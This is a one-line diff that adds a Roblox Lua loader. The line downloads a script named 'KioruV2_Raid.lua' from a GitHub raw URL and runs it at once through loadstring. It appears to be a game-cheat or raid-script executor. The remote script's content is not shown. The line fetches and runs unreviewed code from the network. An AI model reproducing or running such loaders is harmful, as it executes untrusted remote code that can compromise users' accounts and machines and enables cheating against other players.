@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KV-TCode/DonateMe/refs/heads/main/KioruV2_Raid.lua"))()
